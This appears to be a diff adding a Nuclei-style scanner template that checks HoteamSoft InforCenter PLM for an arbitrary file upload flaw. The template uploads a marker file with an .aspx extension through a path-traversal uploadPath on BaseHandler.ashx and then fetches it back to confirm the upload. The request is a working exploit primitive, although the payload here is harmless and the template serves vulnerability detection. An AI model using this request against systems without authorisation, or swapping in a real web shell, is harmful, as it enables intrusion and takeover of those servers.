@@ -1,0 +1,54 @@
+id: hoteamsoft-inforcenter-plm-uploadfilehttp-anyfile-upload
+info:
+  name: HoteamSoft InforCenter PLM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".aspx"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: body
+        regex:
+          - "(?P<file>[0-9a-z-]+).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Files/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
